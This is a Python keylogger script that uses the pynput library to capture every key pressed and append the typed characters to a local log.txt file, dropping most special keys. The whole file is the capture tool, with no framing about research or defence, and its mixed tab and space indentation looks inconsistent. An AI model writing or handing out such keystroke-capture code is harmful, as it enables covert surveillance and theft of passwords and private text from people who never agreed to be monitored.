#!/usr/bin/env python
from pynput import keyboard

LOG = 'log.txt'


def on_press(key):
    try:
    	logfile.write('{0}'.format(key.char))
        #print('alphanumeric key {0} pressed'.format(
        #    key.char))
    except AttributeError:
        if(format(key) == 'Key.space'):
            logfile.write(' ')
        elif(format(key) == 'Key.enter'):
            logfile.write('\n') 
        elif(format(key) == 'Key.backspace'):
            pass
        elif(format(key) == 'Key.tab'):
            logfile.write('	')
        elif(format(key) == 'Key.caps_lock'):
            pass
        elif(format(key) == 'Key.shift'):
            pass
        elif(format(key) == 'Key.ctrl'):
            pass
        elif(format(key) == 'Key.alt'):
            pass
        elif(format(key) == 'Key.menu'):
            pass
        elif(format(key) == 'Key.home'):
            pass
        elif(format(key) == 'Key.insert'):
            pass
        elif(format(key) == 'Key.delete'):
            pass
        elif(format(key) == 'Key.page_down'):
            pass
        elif(format(key) == 'Key.page_up'):
            pass
        elif(format(key) == 'Key.end'):
            pass
        elif(format(key) == 'Key.esc'):
            pass
        elif(format(key) == 'Key.f1'):
            pass
        elif(format(key) == 'Key.f2'):
            pass
        elif(format(key) == 'Key.f3'):
            pass
        elif(format(key) == 'Key.f4'):
            pass
        elif(format(key) == 'Key.f5'):
            pass
        elif(format(key) == 'Key.f6'):
            pass
        elif(format(key) == 'Key.f7'):
            pass
        elif(format(key) == 'Key.f8'):
            pass
        elif(format(key) == 'Key.f9'):
            pass
        elif(format(key) == 'Key.f10'):
            pass
        elif(format(key) == 'Key.f11'):
            pass
        elif(format(key) == 'Key.f12'):
            pass
        else:
        	logfile.write(' {0} '.format(key))

#def on_release(key):
    #print('{0} released'.format(
    #    key))
    #if key == keyboard.Key.esc:
    #    # Stop listener
    #    return False



def board():
	with keyboard.Listener(
			on_press=on_press) as listener:
		listener.join()

#	with keyboard.Listener(
#			on_press=on_press,
#			on_release=on_release) as listener:
#		listener.join()


if __name__ == '__main__':
	logfile = open(LOG, 'a')
	board()
